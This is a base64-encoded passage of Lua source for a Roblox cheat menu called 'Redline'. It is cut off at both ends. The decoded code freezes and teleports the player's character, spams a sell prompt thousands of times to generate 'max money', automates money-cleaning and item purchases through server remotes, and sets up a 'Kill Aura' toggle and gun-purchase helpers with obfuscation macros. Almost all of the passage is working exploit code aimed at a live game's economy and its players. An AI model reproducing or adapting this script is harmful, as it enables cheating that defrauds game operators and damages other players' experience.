CBjaGFyIHRoZW4gcmV0dXJuIGVuZAoKICAgIGxvY2FsIGh1bSA9IGNoYXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkIikKICAgIGxvY2FsIGhycCA9IGNoYXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQoKICAgIGlmIGh1bSB0aGVuCiAgICAgICAgaHVtLldhbGtTcGVlZCA9IDAKICAgICAgICBodW0uSnVtcFBvd2VyID0gMAogICAgICAgIGh1bS5BdXRvUm90YXRlID0gZmFsc2UKICAgIGVuZAoKICAgIGlmIGhycCB0aGVuCiAgICAgICAgaHJwLkFuY2hvcmVkID0gdHJ1ZQogICAgZW5kCmVuZAoKbG9jYWwgZnVuY3Rpb24gVW5mcmVlemVDaGFyYWN0ZXIoKQogICAgbG9jYWwgY2hhciA9IExvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgaWYgbm90IGNoYXIgdGhlbiByZXR1cm4gZW5kCgogICAgbG9jYWwgaHVtID0gY2hhcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWQiKQogICAgbG9jYWwgaHJwID0gY2hhcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCgogICAgaWYgaHVtIHRoZW4KICAgICAgICBodW0uV2Fsa1NwZWVkID0gMTYKICAgICAgICBodW0uSnVtcFBvd2VyID0gNTAKICAgICAgICBodW0uQXV0b1JvdGF0ZSA9IHRydWUKICAgIGVuZAoKICAgIGlmIGhycCB0aGVuCiAgICAgICAgaHJwLkFuY2hvcmVkID0gZmFsc2UKICAgIGVuZAplbmQKClZ1bG5lcmFiaWxpdHlTZWN0aW9uOmJ1dHRvbih7bmFtZSA9ICIgQXV0byBHZW5lcmF0ZSBNYXggTW9uZXkiLCBjYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgIGxvY2FsIEZvdW5kLCBDdXAgPSBHZXRGcnVpdEN1cCgpCgogICAgaWYgQ3VwIGFuZCBGb3VuZCB0aGVuCgogICAgICAgIGxvY2FsIE9MRENGcmFtZSA9IExvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZQoKICAgICAgICBpZiBDdXAuUGFyZW50ID09IExvY2FsUGxheWVyLkJhY2twYWNrIHRoZW4KICAgICAgICAgICAgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkOkVxdWlwVG9vbChDdXApCiAgICAgICAgICAgIHRhc2sud2FpdCgxKQogICAgICAgIGVuZCAKCiAgICAgICAgVGVsZXBvcnQoV29ya3NwYWNlWyJJY2VGcnVpdCBTZWxsIl0uQ0ZyYW1lLCB0cnVlKQoKICAgICAgICB0YXNrLndhaXQoLjUpCgogICAgICAgIGZvciBJbmRleD0xLCA0MDAwIGRvCiAgICAgICAgICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgX2ZpcmVwcm94aW1pdHlwcm9tcHQoV29ya3NwYWNlWyJJY2VGcnVpdCBTZWxsIl0uUHJveGltaXR5UHJvbXB0KQogICAgICAgICAgICBlbmQpCiAgICAgICAgZW5kCgogICAgICAgIFRlbGVwb3J0KE9MRENGcmFtZSkKICAgICAgICByZXR1cm4KICAgIGVuZAoKCiAgICBsb2NhbCBPTERDRnJhbWUgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5DRnJhbWUKCiAgICBsb2NhbCBJdGVteiA9IHsiRmlqaVdhdGVyIiwgIkZyZXNoV2F0ZXIiLCAiSWNlLUZydWl0IEJhZyIsICJJY2UtRnJ1aXQgQ3VweiJ9CiAgICBsb2NhbCBTdG92ZTsKCiAgICBmb3IgSW5kZXgsIFZhbHVlIGluIFdvcmtzcGFjZS5Db29raW5nUG90czpHZXRDaGlsZHJlbigpIGRvCiAgICAgICAgaWYgVmFsdWU6SXNBKCJNb2RlbCIpIHRoZW4KICAgICAgICAgICAgaWYgVmFsdWU6RmluZEZpcnN0Q2hpbGRXaGljaElzQSgiUHJveGltaXR5UHJvbXB0IiwgdHJ1ZSkuQWN0aW9uVGV4dCA9PSAiVHVybiBPbiIKICAgICAgICAgICAgYW5kIFZhbHVlOkZpbmRGaXJzdENoaWxkV2hpY2hJc0EoIlByb3hpbWl0eVByb21wdCIsIHRydWUpLkVuYWJsZWQgdGhlbgogICAgICAgICAgICAgICAgU3RvdmUgPSBWYWx1ZQogICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKCiAgICBmb3IgSW5kZXgsIFZhbHVlIGluIEl0ZW16IGRvCiAgICAgICAgaWYgbm90IExvY2FsUGxheWVyLkJhY2twYWNrOkZpbmRGaXJzdENoaWxkKFZhbHVlKSB0aGVuCiAgICAgICAgICAgIFJlcGxpY2F0ZWRTdG9yYWdlOldhaXRGb3JDaGlsZCgiRXhvdGljU2hvcFJlbW90ZSIpOkludm9rZVNlcnZlcihWYWx1ZSkKICAgICAgICAgICAgdGFzay53YWl0KDAuMSkKICAgICAgICBlbmQKICAgIGVuZAoKICAgIGxvY2FsIENoZWNrID0gZmFsc2U7CgogICAgZm9yIEluZGV4LCBWYWx1ZSBpbiBJdGVteiBkbwogICAgICAgIGlmIG5vdCBMb2NhbFBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZChWYWx1ZSkgdGhlbgogICAgICAgICAgICBDaGVjayA9IHRydWUKICAgICAgICBlbmQKICAgIGVuZAoKICAgIGlmIENoZWNrIHRoZW4KICAgICAgICBsaWJyYXJ5Lm5vdGlmaWNhdGlvbnM6Y3JlYXRlX25vdGlmaWNhdGlvbih7CiAgICAgICAgICAgIG5hbWUgPSAiUmVkbGluZSIsCiAgICAgICAgICAgIGluZm8gPSBgQ291bGQgbm90IGZpbmQgaXRlbXMhIFBsZWFzZSBjaGVjayB5b3UgaGF2ZSBtb3JlIHRoYW4gNTAwMCQuYCwKICAgICAgICAgICAgbGlmZXRpbWUgPSAxMAogICAgICAgIH0pCiAgICAgICAgcmV0dXJuCiAgICBlbmQKCiAgICBUZWxlcG9ydChTdG92ZS5Db29rUGFydC5DRnJhbWUsIHRydWUpCgogICAgdGFzay53YWl0KDEpCgogICAgRnJlZXplQ2hhcmFjdGVyKCkKICAgIFN0YXJ0ZXJHdWk6U2V0Q29yZUd1aUVuYWJsZWQoRW51bS5Db3JlR3VpVHlwZS5CYWNrcGFjaywgZmFsc2UpCgogICAgdGFzay53YWl0KDEpCgogICAgZmlyZXByb3hpbWl0eXByb21wdChTdG92ZTpGaW5kRmlyc3RDaGlsZFdoaWNoSXNBKCJQcm94aW1pdHlQcm9tcHQiLCB0cnVlKSkKCiAgICB0YXNrLndhaXQoMikKCiAgICBmb3IgSW5kZXgsIFZhbHVlIGluIHsiRmlqaVdhdGVyIiwgIkZyZXNoV2F0ZXIiLCAiSWNlLUZydWl0IEJhZyJ9IGRvCiAgICAgICAgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkOkVxdWlwVG9vbChMb2NhbFBsYXllci5CYWNrcGFja1tWYWx1ZV0pCiAgICAgICAgdGFzay53YWl0KDEpCiAgICAgICAgZmlyZXByb3hpbWl0eXByb21wdChTdG92ZTpGaW5kRmlyc3RDaGlsZFdoaWNoSXNBKCJQcm94aW1pdHlQcm9tcHQiLCB0cnVlKSkKICAgICAgICB0YXNrLndhaXQoMykKICAgIGVuZAoKICAgIHJlcGVhdCB0YXNrLndhaXQoKSB1bnRpbCBTdG92ZS5Db29rUGFydC5TdGVhbS5Mb2FkVUkuRW5hYmxlZCA9PSBmYWxzZQoKICAgIGlmIG5vdCBMb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkljZS1GcnVpdCBDdXB6IikgdGhlbgogICAgICAgIExvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZDpFcXVpcFRvb2woTG9jYWxQbGF5ZXIuQmFja3BhY2tbJ0ljZS1GcnVpdCBDdXB6J10pCiAgICAgICAgdGFzay53YWl0KDEpCiAgICBlbmQKICAgIAogICAgdGFzay53YWl0KDEpCgogICAgZmlyZXByb3hpbWl0eXByb21wdChTdG92ZTpGaW5kRmlyc3RDaGlsZFdoaWNoSXNBKCJQcm94aW1pdHlQcm9tcHQiLCB0cnVlKSkKCiAgICB0YXNrLndhaXQoMykKCiAgICBVbmZyZWV6ZUNoYXJhY3RlcigpCgogICAgVGVsZXBvcnQoV29ya3NwYWNlWyJJY2VGcnVpdCBTZWxsIl0uQ0ZyYW1lLCB0cnVlKQoKICAgIHRhc2sud2FpdCgxKQoKICAgIEZyZWV6ZUNoYXJhY3RlcigpCgogICAgdGFzay53YWl0KDEuNSkKCiAgICBpZiBub3QgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJJY2UtRnJ1aXQgQ3VweiIpIHRoZW4KICAgICAgICBMb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQ6RXF1aXBUb29sKExvY2FsUGxheWVyLkJhY2twYWNrWydJY2UtRnJ1aXQgQ3VweiddKQogICAgICAgIHRhc2sud2FpdCgxKQogICAgZW5kCgogICAgV29ya3NwYWNlWyJJY2VGcnVpdCBTZWxsIl0uUHJveGltaXR5UHJvbXB0LkhvbGREdXJhdGlvbiA9IDAKCiAgICBmb3IgSW5kZXg9MSwgNDAwMCBkbwogICAgICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICBfZmlyZXByb3hpbWl0eXByb21wdChXb3Jrc3BhY2VbIkljZUZydWl0IFNlbGwiXS5Qcm94aW1pdHlQcm9tcHQpCiAgICAgICAgZW5kKQogICAgZW5kCgogICAgVW5mcmVlemVDaGFyYWN0ZXIoKQogICAgU3RhcnRlckd1aTpTZXRDb3JlR3VpRW5hYmxlZChFbnVtLkNvcmVHdWlUeXBlLkJhY2twYWNrLCB0cnVlKQoKICAgIHRhc2sud2FpdCgwLjUpCgogICAgVGVsZXBvcnQoT0xEQ0ZyYW1lLCB0cnVlKQoKICAgIHRhc2sud2FpdCgyKQoKZW5kfSkKClZ1bG5lcmFiaWxpdHlTZWN0aW9uOmJ1dHRvbih7bmFtZSA9ICJDbGVhbiBBbGwgUmVkIE1vbmV5IiwgY2FsbGJhY2sgPSBMUEhfTk9fVklSVFVBTElaRShmdW5jdGlvbigpCiAgICAgICAgaWYgTG9jYWxQbGF5ZXIuc3RvcmVkLkZpbHRoeVN0YWNrLlZhbHVlID09IDAgdGhlbiAKICAgICAgICAgICAgcmV0dXJuIGxpYnJhcnkubm90aWZpY2F0aW9uczpjcmVhdGVfbm90aWZpY2F0aW9uKHsKICAgICAgICAgICAgICAgIG5hbWUgPSAiUmVkbGluZSIsCiAgICAgICAgICAgICAgICBpbmZvID0gIllvdSBoYXZlIG5vIG1vbmV5ISIsCiAgICAgICAgICAgICAgICBsaWZldGltZSA9IDcuNQogICAgICAgICAgICB9KQogICAgICAgIGVuZAoKICAgICAgICBsb2NhbCBjaGFyYWN0ZXIgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICBpZiBub3QgY2hhcmFjdGVyIG9yIG5vdCBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKSB0aGVuIHJldHVybiBlbmQKICAgICAgICBsb2NhbCBodW1hbm9pZCA9IGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWQiKQogICAgICAgIGlmIG5vdCBodW1hbm9pZCBvciBodW1hbm9pZC5IZWFsdGggPT0gMCB0aGVuIHJldHVybiBlbmQKCiAgICAgICAgbG9jYWwgQ2xlYW5lciA9IEdldEdvb2RDbGVhbmVyKCkKICAgICAgICBpZiBub3QgQ2xlYW5lciB0aGVuCiAgICAgICAgICAgIHJldHVybiBsaWJyYXJ5Lm5vdGlmaWNhdGlvbnM6Y3JlYXRlX25vdGlmaWNhdGlvbih7CiAgICAgICAgICAgICAgICBuYW1lID0gIlJlZGxpbmUiLAogICAgICAgICAgICAgICAgaW5mbyA9ICJDb3VsZCBub3QgZmluZCBhIHZhbGlkIGNsZWFuZXIhIiwKICAgICAgICAgICAgICAgIGxpZmV0aW1lID0gNy41CiAgICAgICAgICAgIH0pCiAgICAgICAgZW5kCgogICAgICAgIGxvY2FsIE9sZENGID0gY2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lCgogICAgICAgIFRlbGVwb3J0KENsZWFuZXIuV29ybGRQaXZvdCkKICAgICAgICB0YXNrLndhaXQoMC40KQogICAgICAgIGZpcmVwcm94aW1pdHlwcm9tcHQoQ2xlYW5lcjpGaW5kRmlyc3RDaGlsZCgiQ2FzaFByb21wdCIsIHRydWUpKQoKICAgICAgICByZXBlYXQgdGFzay53YWl0KCkgdW50aWwgQ2xlYW5lcjpGaW5kRmlyc3RDaGlsZCgiT24iLCB0cnVlKS5Db2xvciA9PSBDb2xvcjMuZnJvbVJHQig3NCwxNTYsNjkpCiAgICAgICAgdGFzay53YWl0KDAuNSkKICAgICAgICBmaXJlcHJveGltaXR5cHJvbXB0KENsZWFuZXI6RmluZEZpcnN0Q2hpbGQoIkNhc2hQcm9tcHQiLCB0cnVlKSkKICAgICAgICB0YXNrLndhaXQoMC4yNSkKCiAgICAgICAgVGVsZXBvcnQoQ2xlYW5lci5Xb3JsZFBpdm90KQogICAgICAgIHRhc2sud2FpdCgwLjQpCgogICAgICAgIHJlcGVhdCB0YXNrLndhaXQoKSB1bnRpbCBMb2NhbFBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiTW9uZXlSZWFkeSIpCiAgICAgICAgaHVtYW5vaWQ6RXF1aXBUb29sKExvY2FsUGxheWVyLkJhY2twYWNrWyJNb25leVJlYWR5Il0pCgogICAgICAgIHJlcGVhdAogICAgICAgICAgICBmaXJlcHJveGltaXR5cHJvbXB0KENsZWFuZXI6RmluZEZpcnN0Q2hpbGQoIkdyYWJQcm9tcHQiLCB0cnVlKSkKICAgICAgICAgICAgdGFzay53YWl0KDMpCiAgICAgICAgdW50aWwgbm90IGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiTW9uZXlSZWFkeSIpCgogICAgICAgIHJlcGVhdCB0YXNrLndhaXQoMSkgdW50aWwgTG9jYWxQbGF5ZXIuQmFja3BhY2s6RmluZEZpcnN0Q2hpbGQoIkJhZ09mTW9uZXkiKQogICAgICAgIFRlbGVwb3J0KENGcmFtZS5uZXcoLTIyMi4yOSwgMjgzLjgxLCAtMTIwMC45MCkpCiAgICAgICAgaHVtYW5vaWQ6RXF1aXBUb29sKExvY2FsUGxheWVyLkJhY2twYWNrWyJCYWdPZk1vbmV5Il0pCiAgICAgICAgdGFzay53YWl0KDIpCiAgICAgICAgZmlyZXByb3hpbWl0eXByb21wdChXb3Jrc3BhY2UuQVRNTW9uZXkuUHJvbXB0KQoKICAgICAgICBUZWxlcG9ydChPbGRDRikKICAgIGVuZCkKfSkKClZ1bG5lcmFiaWxpdHlTZWN0aW9uOmJ1dHRvbih7bmFtZSA9ICJNYW51YWwgR2VuZXJhdGUgTWF4IE1vbmV5IiwgY2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgbG9jYWwgY2hhciA9IExvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgIGlmIG5vdCBjaGFyIHRoZW4gcmV0dXJuIGVuZAoKICAgICAgICBsb2NhbCBocnAgPSBjaGFyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICBpZiBub3QgaHJwIHRoZW4gcmV0dXJuIGVuZAoKICAgICAgICBsb2NhbCBDdXAgPSBuaWwKCiAgICAgICAgZm9yIF8sIHYgaW4gaXBhaXJzKGNoYXI6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgaWYgdjpJc0EoIlRvb2wiKSBhbmQgdi5OYW1lID09ICJJY2UtRnJ1aXQgQ3VweiIgdGhlbgogICAgICAgICAgICAgICAgQ3VwID0gdgogICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCgogICAgICAgIGlmIG5vdCBDdXAgdGhlbgogICAgICAgICAgICBmb3IgXywgdiBpbiBpcGFpcnMoTG9jYWxQbGF5ZXIuQmFja3BhY2s6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgICAgIGlmIHY6SXNBKCJUb29sIikgYW5kIHYuTmFtZSA9PSAiSWNlLUZydWl0IEN1cHoiIHRoZW4KICAgICAgICAgICAgICAgICAgICBDdXAgPSB2CiAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKCiAgICAgICAgaWYgbm90IEN1cCB0aGVuCiAgICAgICAgICAgIGxpYnJhcnkubm90aWZpY2F0aW9uczpjcmVhdGVfbm90aWZpY2F0aW9uKHsKICAgICAgICAgICAgICAgIG5hbWUgPSAiUmVkbGluZSIsCiAgICAgICAgICAgICAgICBpbmZvID0gIlUgRG9udCBIYXZlIEN1cCEiLAogICAgICAgICAgICAgICAgbGlmZXRpbWUgPSA1CiAgICAgICAgICAgIH0pCiAgICAgICAgICAgIHJldHVybgogICAgICAgIGVuZAoKICAgICAgICBpZiBDdXAuUGFyZW50ID09IExvY2FsUGxheWVyLkJhY2twYWNrIHRoZW4KICAgICAgICAgICAgY2hhci5IdW1hbm9pZDpFcXVpcFRvb2woQ3VwKQogICAgICAgICAgICB0YXNrLndhaXQoMC41KQogICAgICAgIGVuZAoKICAgICAgICBsb2NhbCBPbGRDRnJhbWUgPSBocnAuQ0ZyYW1lCiAgICAgICAgCiAgICAgICAgVGVsZXBvcnQoV29ya3NwYWNlWyJJY2VGcnVpdCBTZWxsIl0uQ0ZyYW1lLCB0cnVlKQogICAgICAgIHRhc2sud2FpdCgwLjUpCgogICAgICAgIFdvcmtzcGFjZVsiSWNlRnJ1aXQgU2VsbCJdLlByb3hpbWl0eVByb21wdC5Ib2xkRHVyYXRpb24gPSAwCgogICAgICAgIGZvciBpID0gMSwgMjAwMCBkbwogICAgICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIF9maXJlcHJveGltaXR5cHJvbXB0KFdvcmtzcGFjZVsiSWNlRnJ1aXQgU2VsbCJdLlByb3hpbWl0eVByb21wdCkKICAgICAgICAgICAgZW5kKQogICAgICAgIGVuZAoKICAgICAgICB0YXNrLndhaXQoMC41KQoKICAgICAgICBUZWxlcG9ydChPbGRDRnJhbWUsIHRydWUpCgogICAgICAgIGxpYnJhcnkubm90aWZpY2F0aW9uczpjcmVhdGVfbm90aWZpY2F0aW9uKHsKICAgICAgICAgICAgbmFtZSA9ICJSZWRsaW5lIiwKICAgICAgICAgICAgaW5mbyA9ICJNYW51YWwgTW9uZXkgRG9uZSIsCiAgICAgICAgICAgIGxpZmV0aW1lID0gNQogICAgICAgIH0pCiAgICBlbmQKfSkKClZ1bG5lcmFiaWxpdHlTZWN0aW9uOmJ1dHRvbih7bmFtZSA9ICJCdXkgSXRlbXMgRm9yIE1hbnVhbCBBbmQgVHAgU3RvdmUiLCBjYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCBJdGVtcyA9IHsKICAgICAgICAgICAgIkZpamlXYXRlciIsCiAgICAgICAgICAgICJGcmVzaFdhdGVyIiwKICAgICAgICAgICAgIkljZS1GcnVpdCBCYWciLAogICAgICAgICAgICAiSWNlLUZydWl0IEN1cHoiCiAgICAgICAgfQoKICAgICAgICBmb3IgXywgaXRlbSBpbiBpcGFpcnMoSXRlbXMpIGRvCiAgICAgICAgICAgIGlmIG5vdCBMb2NhbFBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZChpdGVtKSB0aGVuCiAgICAgICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgUmVwbGljYXRlZFN0b3JhZ2U6V2FpdEZvckNoaWxkKCJFeG90aWNTaG9wUmVtb3RlIik6SW52b2tlU2VydmVyKGl0ZW0pCiAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4wNykKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCgogICAgICAgIGxpYnJhcnkubm90aWZpY2F0aW9uczpjcmVhdGVfbm90aWZpY2F0aW9uKHsKICAgICAgICAgICAgbmFtZSA9ICJSZWRsaW5lIiwKICAgICAgICAgICAgaW5mbyA9ICJCb3VnaHQgSXRlbXMhIiwKICAgICAgICAgICAgbGlmZXRpbWUgPSA1CiAgICAgICAgfSkKCiAgICAgICAgbG9jYWwgU3RvdmUgPSBuaWwKCiAgICAgICAgZm9yIF8sIHYgaW4gV29ya3NwYWNlLkNvb2tpbmdQb3RzOkdldENoaWxkcmVuKCkgZG8KICAgICAgICAgICAgaWYgdjpJc0EoIk1vZGVsIikgdGhlbgogICAgICAgICAgICAgICAgbG9jYWwgcHJvbXB0ID0gdjpGaW5kRmlyc3RDaGlsZFdoaWNoSXNBKCJQcm94aW1pdHlQcm9tcHQiLCB0cnVlKQogICAgICAgICAgICAgICAgaWYgcHJvbXB0IGFuZCBwcm9tcHQuQWN0aW9uVGV4dCA9PSAiVHVybiBPbiIgYW5kIHByb21wdC5FbmFibGVkIHRoZW4KICAgICAgICAgICAgICAgICAgICBTdG92ZSA9IHYKICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAoKICAgICAgICBpZiBTdG92ZSBhbmQgU3RvdmU6RmluZEZpcnN0Q2hpbGQoIkNvb2tQYXJ0IikgdGhlbgogICAgICAgICAgICBUZWxlcG9ydChTdG92ZS5Db29rUGFydC5DRnJhbWUsIHRydWUpCiAgICAgICAgZW5kCiAgICBlbmQKfSkKCgoKICAgICAgICAgICAgICAgIGxvY2FsIEtpbGxBdXJhU2VjdGlvbiA9IENvbHVtbjpzZWN0aW9uKHtuYW1lID0gIktpbGwgQXVyYSBTZWN0aW9uIiwgc2l6ZSA9IDAuMjc1LCBkZWZhdWx0ID0gZmFsc2UsIHNpZGUgPSAncmlnaHQnLCBpY29uID0gR2V0SW1hZ2UoIkJ1bGxldC5wbmciKX0pIAoKICAgICAgICAgICAgICAgIEtpbGxBdXJhU2VjdGlvbjp0b2dnbGUoe25hbWUgPSAiRW5hYmxlZCAtIEhvbGQgR3VuIiwgZmxhZyA9ICJLaWxsQXVyYV9FbmFibGVkX1RCMyIsIHR5cGUgPSAidG9nZ2xlIiwgZGVmYXVsdCA9IGZhbHNlLCBjYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgICAgICAgICAgICAgIENvbmZpZy5UaGVCcm9ueC5LaWxsQXVyYSA9IHN0YXRlCiAgICAgICAgICAgICAgICBlbmR9KQoKICAgICAgICAgICAgICAgIEtpbGxBdXJhU2VjdGlvbjpzbGlkZXIoe25hbWUgPSAiS2lsbCBBdXJhIFJhbmdlIiwgZmxhZyA9ICJLaWxsQXVyYVJhbmdlX1RCMyIsIG1pbiA9IDAsIG1heCA9IDEwMDAsIGRlZmF1bHQgPSAzMDAsIHN1ZmZpeCA9ICJzdCIsIGNhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgICAgICAgICAgICAgQ29uZmlnLlRoZUJyb254LktpbGxBdXJhUmFuZ2UgPSBzdGF0ZQogICAgICAgICAgICAgICAgZW5kfSkKICAgICAgICAgICAgZW5kCgogICAgICAgICAgICBkbyAtLSBcXCBQdXJjaGFzZSBHdW5zCiAgICAgICAgICAgICAgICBsb2NhbCBQdXJjaGFzZUd1bkNvbHVtbiA9IFB1cmNoYXNlR3VuVGFiOmNvbHVtbih7fSkKCiAgICAgICAgICAgICAgICBsb2NhbCBXZWFwb25MaXN0U2VjdGlvbiA9IFB1cmNoYXNlR3VuQ29sdW1uOnNlY3Rpb24oe25hbWUgPSAiUHVyY2hhc2UgU2VsZWN0ZWQgSXRlbSIsIHNpZGUgPSAibGVmdCIsIHNpemUgPSAwLjU1MCwgaWNvbiA9IEdldEltYWdlKCJDYXNoLnBuZyIpfSkKCiAgICAgICAgICAgICAgICAtLVtbV2VhcG9uTGlzdFNlY3Rpb246bGlzdCh7ZmxhZyA9ICJQdXJjaGFzZVNlbGVjdGVkSXRlbV9UaGVCcm9ueCIsIG9wdGlvbnMgPSBDb25maWcuR3VucywgY2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICAgICAgICAgICAgICB0YXNrLnNwYXduKExQSF9OT19WSVJUVUFMSVpFKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IHN0YXRlIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICAgICAgICAgIENvbmZpZy5UaGVCcm9ueC5TZWxlY3RlZF9JdGVtID0gc3RhdGUKCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHNlbGYgPSBzdHJpbmcubWF0Y2goQ29uZmlnLlRoZUJyb254LlNlbGVjdGVkX0l0ZW0sICJeKC4qKSAlLSIpOwoKICAgICAgICAgICAgICAgICAgICAgICAgc2VsZiA9IHNlbGY6bWF0Y2goIl4lcyooLi0pJXMqJCIpOwogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBPbGRDRnJhbWUgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5DRnJhbWU7CiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIFByb21wdCA9IFdvcmtzcGFjZTpGaW5kRmlyc3RDaGlsZCgiR1VOUyIpW3NlbGZdOkZpbmRGaXJzdENoaWxkV2hpY2hJc0EoIlByb3hpbWl0eVByb21wdCIsdHJ1ZSk7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChXb3Jrc3BhY2U6RmluZEZpcnN0Q2hpbGQoIkdVTlMiKVtzZWxmXTpGaW5kRmlyc3RDaGlsZCgiR2FtZXBhc3NJRCIsIHRydWUpIGFuZCBub3QgTWFya2V0cGxhY2VTZXJ2aWNlOlVzZXJPd25zR2FtZVBhc3NBc3luYyhMb2NhbFBsYXllci5Vc2VySWQsIFdvcmtzcGFjZTpGaW5kRmlyc3RDaGlsZCgiR1VOUyIpW3NlbGZdOkZpbmRGaXJzdENoaWxkKCJHYW1lcGFzc0lEIix0cnVlKS5WYWx1ZSkpIHRoZW4gCiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gbGlicmFyeS5ub3RpZmljYXRpb25zOmNyZWF0ZV9ub3RpZmljYXRpb24oewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG5hbWUgPSAiUmVkbGluZSIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaW5mbyA9IGBZb3UgZG8gbm90IG93biB0aGlzIGdhbWVwYXNzIWAsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGlmZXRpbWUgPSA1CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KQogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIC0taWYgU29sYXJhIHRoZW4gUHJvbXB0LkhvbGREdXJhdGlvbiA9IDA7IGVuZAoKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgUGFydCA9IFByb21wdC5QYXJlbnQ6SXNBKCJQYXJ0IikgYW5kIFByb21wdC5QYXJlbnQuQ0ZyYW1lIG9yIFByb21wdC5QYXJlbnQ6SXNBKCJNZXNoUGFydCIpIGFuZCBQcm9tcHQuUGFyZW50LkNGcmFtZSBvciBQcm9tcHQuUGFyZW50OklzQSgiVW5pb25PcGVyYXRpb24iKSBhbmQgUHJvbXB0LlBhcmVudC5DRnJhbWU7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIExvY2FsUGxheWVyLnN0b3JlZC5Nb25leS5WYWx1ZSA8IFdvcmtzcGFjZTpGaW5kRmlyc3RDaGlsZCgiR1VOUyIpW3NlbGZdOkZpbmRGaXJzdENoaWxkKCJQcmljZSIsdHJ1ZSkuVmFsdWUgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGxpYnJhcnkubm90aWZpY2F0aW9uczpjcmVhdGVfbm90aWZpY2F0aW9uKHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBuYW1lID0gIlJlZGxpbmUiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGluZm8gPSBgWW91IGFyZSAke1dvcmtzcGFjZTpGaW5kRmlyc3RDaGlsZCgiR1VOUyIpW3NlbGZdOkZpbmRGaXJzdENoaWxkKCJQcmljZSIsdHJ1ZSkuVmFsdWUgLSBMb2NhbFBsYXllci5zdG9yZWQuTW9uZXkuVmFsdWV9IHNob3J0LmAsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGlmZXRpbWUgPSA1CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KQogICAgICAgICAgICAgICAgICAgICAgICBlbmQ7CiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICB0YXNrLnNwYXduKFRlbGVwb3J0LCBQYXJ0KQoKI